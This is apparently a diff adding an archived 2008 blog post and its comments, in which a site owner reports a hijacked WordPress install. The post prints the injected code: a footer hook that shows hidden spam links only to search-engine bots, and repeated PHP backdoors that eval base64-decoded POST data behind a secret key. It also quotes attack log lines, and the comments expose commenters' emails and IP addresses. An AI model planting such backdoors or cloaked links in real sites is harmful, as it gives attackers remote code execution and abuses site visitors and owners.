@@ -1,0 +1,65 @@
+---
+title: wpc7c16b8466d864eeefd20050625c7775
+comments:
+  - author: Albert
+    email: albert.lash@savonix.com
+    ip: 74.94.149.33
+    url:
+    date: 02/25/2008 12:57:10 PM
+    text: >
+      I've added a bevy of IP CIDR blocks to my POST restrictions, and I'm definitely going to review all of Wordpress for this.
+  - author: Albert
+    email: albert.lash@savonix.com
+    ip: 75.69.165.231
+    url:
+    date: 02/25/2008 06:40:58 PM
+    text: >
+      As far as I can tell, this is a well know vulnerability, and Automattic has since fixed the issue. In my case, to remedy the situation, I changed the permissions to read only in wp-includes, wp-admin, as well as reviewed all the files to remove the injected scripts.
+  - author: Michi
+    email: fritzbrause@hotmail.com
+    ip: 217.87.16.84
+    url:
+    date: 03/06/2008 08:26:46 PM
+    text: >
+      I found this by searching "194.110.162.23" because my wordpress got hijacked as well. I stil don't really know what and how that happened. Do you have any more information? How did they get access?
+  - author: Albert
+    email: albert.lash@savonix.com
+    ip: 75.69.165.231
+    url:
+    date: 03/06/2008 09:32:00 PM
+    text: >
+      Hi Michi, there are probably a bunch of different ways its done, but in my case, here's what I *think* happened:<br/><br/>1. Abuser registered and gained access to some basic functionality -or- used a cookie to execute some malicious code, not sure<br/>2. My server files had incorrect permissions - the web server was able to write to the wp-includes directory and files<br/>3. Abuser modified files to act as a gateway to execute their own php scripts (and shell scripts?) on server<br/><br/>I made several changes to my setup, an important one being to change all the wordpress php files to be only readable by the webserver.
+date: 2008-02-25
+tags: wordpress
+---
+<pre>--- default-filters.php (revision 6)
++++ default-filters.php (working copy)
+@@ -42,6 +42,26 @@ add_filter('comment_flood_filter', 'wp_throttle_comment_flood', 10, 3);
+++add_action('wp_footer','wpc7c16b8466d864eeefd20050625c7775');
++function wpc7c16b8466d864eeefd20050625c7775() {
++        $seau=array("google","yahoo","slurp","msn","live","ask","altavista","aol");
++       $sebot=""; foreach($seau as $ua) if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']),$ua)!==false){ $sebot="1"; break; }
++       if(!($sebot==1 && sizeof($_COOKIE)==0)) return;
++       @include('./wp-includes/class-mail.php');
++       if(sizeof($wparr)>0){
++               shuffle($wparr);
++               echo "<div id=\"_wp_footer\">";
++               foreach($wparr as $k=>$v){
++                       echo "<a href=\"".$v['url']."\" title=\"".ucwords($v['key'])."\">".ucwords($v['key'])."</a>\n";
++                       if($i++==$inum) break;
++               }
++               echo "</div>".$_footer;
++       }
++}
++++</pre>
+
+<pre>&lt;?php if($_GET['f41887163354da50']=="28cbddc8f3bcd0f7"){ eval(base64_decode($_POST['file'])); exit; } ?>&lt;?php if($_GET['6fed0a04901ae41f']=="a1ceef3a748b981b"){ eval(base64_decode($_POST['file'])); exit; } ?>&lt;?php if($_GET['666a6114308099d3']=="a5522ccd36231771"){ eval(base64_decode($_POST['file'])); exit; } ?>&lt;?php if($_GET['970a0ddc6270e0ca']=="178d4b7fa8fc73a4"){ eval(base64_decode($_POST['file'])); exit; } ?>&lt;?php if($_GET['476cec30ae48ed13']=="1682480ecf14ff65"){ eval(base64_decode($_POST['file'])); exit; } ?></pre>
+
+Bad news. Who is responsible?
+
+<pre>www.infonomix.org 194.110.162.23 [25/Feb/2008:07:21:06 -0500] "POST /blog/wp-includes/default-filters.php?970a0ddc6270e0ca=178d4b7fa8fc73a4 HTTP/1.1" 200 179
+
+www.infonomix.org 194.110.162.23 [25/Feb/2008:07:21:07 -0500] "POST /blog/ HTTP/1.1" 200 27176</pre>
+
+¥
+
